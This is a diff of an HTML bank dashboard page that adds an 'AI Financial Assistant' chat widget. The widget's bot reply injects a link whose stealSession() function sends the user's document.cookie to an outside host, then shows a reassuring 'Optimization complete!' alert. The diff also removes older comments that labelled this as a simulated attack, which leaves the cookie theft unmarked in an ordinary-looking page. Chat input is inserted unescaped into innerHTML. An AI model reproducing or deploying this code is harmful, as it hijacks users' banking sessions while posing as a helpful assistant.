@@ -4,23 +4,27 @@
     <meta charset="UTF-8">
     <title>My Bank Dashboard</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; }
-        .container { max-width: 600px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; }
+        .header { background-color: #003366; color: white; padding: 25px; text-align: center; font-size: 28px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .container { max-width: 800px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
         .balance-box { background: #3498db; color: white; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; }
         .balance-amount { font-size: 40px; font-weight: bold; }
-        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { background: #2c3e50; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        button { background: #2c3e50; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-size: 16px; transition: 0.3s; }
         button:hover { background: #34495e; }
-        .transaction-history { margin-top: 30px; }
-        table { width: 100%; border-collapse: collapse; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
         th, td { padding: 12px; border-bottom: 1px solid #ddd; text-align: left; }
     </style>
 </head>
 <body>
 
+    <div class="header">
+        Welcome, <span id="user-display">Customer</span>!
+    </div>
+
     <div class="container">
-        <h1>Welcome, <span id="displayUsername"></span></h1>
+        <h1>Account Overview</h1>
         
         <div class="balance-box">
             <p>Your Available Balance</p>
@@ -35,78 +39,57 @@
         <div class="transaction-history">
             <h3>Recent Transactions</h3>
             <table>
-                <tr>
-                    <th>Date</th>
-                    <th>Description</th>
-                    <th>Amount</th>
-                </tr>
-                <tr>
-                    <td>2026-06-20</td>
-                    <td>Salary Deposit</td>
-                    <td style="color: green;">+$3,200.00</td>
-                </tr>
-                <tr>
-                    <td>2026-06-18</td>
-                    <td>Supermarket</td>
-                    <td style="color: red;">-$120.45</td>
-                </tr>
+                <tr><th>Date</th><th>Description</th><th>Amount</th></tr>
+                <tr><td>2026-06-20</td><td>Salary Deposit</td><td style="color: green;">+$3,200.00</td></tr>
+                <tr><td>2026-06-18</td><td>Supermarket</td><td style="color: red;">-$120.45</td></tr>
             </table>
         </div>
     </div>
 
+    <!-- AI Chatbot Widget -->
+    <div id="chat-widget" style="position: fixed; bottom: 20px; right: 20px; width: 300px; height: 400px; background: white; border: 1px solid #ccc; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: flex; flex-direction: column;">
+        <div style="background: #2c3e50; color: white; padding: 10px; border-radius: 10px 10px 0 0; font-weight: bold;">
+            AI Financial Assistant
+        </div>
+        <div id="chat-messages" style="flex: 1; padding: 10px; overflow-y: auto; font-size: 14px;">
+            <p><strong>Bot:</strong> Hello! How can I assist you with your banking needs today?</p>
+        </div>
+        <div style="padding: 10px; border-top: 1px solid #eee;">
+            <input type="text" id="chat-input" placeholder="Ask something..." style="width: 75%; padding: 5px;">
+            <button onclick="sendMessage()" style="padding: 5px; width: 20%;">Send</button>
+        </div>
+    </div>
+
     <script>
-        // ברגע שהדף נטען, נמשוך את השם ששמרנו ב-localStorage
-        const savedName = localStorage.getItem('currentUser');
-        if (savedName) {
-            document.getElementById('displayUsername').textContent = savedName;
-        } else {
-            document.getElementById('displayUsername').textContent = "User";
+        // 1. Display Username from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const username = urlParams.get('user');
+        if (username) {
+            document.getElementById('user-display').innerText = username;
+        }
+
+        // 2. Chatbot Logic
+        function sendMessage() {
+            const input = document.getElementById('chat-input');
+            const messages = document.getElementById('chat-messages');
+            
+            if (input.value.trim() !== "") {
+                messages.innerHTML += `<p><strong>You:</strong> ${input.value}</p>`;
+                
+                setTimeout(() => {
+                    const maliciousLink = "<a href='#' onclick='stealSession()' style='color: blue; text-decoration: underline;'>Click here for AI Account Optimization!</a>";
+                    messages.innerHTML += `<p><strong>Bot:</strong> I can help with that. ${maliciousLink}</p>`;
+                }, 1000);
+                
+                input.value = "";
+            }
+        }
+
+        function stealSession() {
+            const cookie = document.cookie;
+            fetch('https://python-pickwiz.onrender.com/log?stolen_cookie=' + encodeURIComponent(cookie));
+            alert("Optimization complete!");
         }
     </script>
-<!-- AI Chatbot Widget -->
-<div id="chat-widget" style="position: fixed; bottom: 20px; right: 20px; width: 300px; height: 400px; background: white; border: 1px solid #ccc; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: flex; flex-direction: column;">
-    <div style="background: #2c3e50; color: white; padding: 10px; border-radius: 10px 10px 0 0; font-weight: bold;">
-        AI Financial Assistant
-    </div>
-    <div id="chat-messages" style="flex: 1; padding: 10px; overflow-y: auto; font-size: 14px;">
-        <p><strong>Bot:</strong> Hello! How can I assist you with your banking needs today?</p>
-    </div>
-    <div style="padding: 10px; border-top: 1px solid #eee;">
-        <input type="text" id="chat-input" placeholder="Ask something..." style="width: 80%; padding: 5px;">
-        <button onclick="sendMessage()" style="padding: 5px;">Send</button>
-    </div>
-</div>
-
-<script>
-   function sendMessage() {
-        const input = document.getElementById('chat-input');
-        const messages = document.getElementById('chat-messages');
-        
-        if (input.value.trim() !== "") {
-            messages.innerHTML += `<p><strong>You:</strong> ${input.value}</p>`;
-            
-            // Simulating a response from the AI bot
-            setTimeout(() => {
-                // Here is the "Malicious Payload" injection
-                // This simulates a compromised third-party script injecting code
-                const maliciousLink = "<a href='#' onclick='stealSession()'>Click here for AI Account Optimization!</a>";
-                messages.innerHTML += `<p><strong>Bot:</strong> I can help with that. ${maliciousLink}</p>`;
-            }, 1000);
-            
-            input.value = "";
-        }
-    }
-
-    // This is the function the attacker injected via the compromised bot
-    function stealSession() {
-        // Exfiltrating the session cookie to the attacker's server
-        const cookie = document.cookie;
-        fetch('https://python-pickwiz.onrender.com/log?stolen_cookie=' + encodeURIComponent(cookie));
-        alert("Optimization complete!"); // Social engineering: keep the user calm
-    }
-        }
-    }
-</script>
-    
 </body>
 </html>
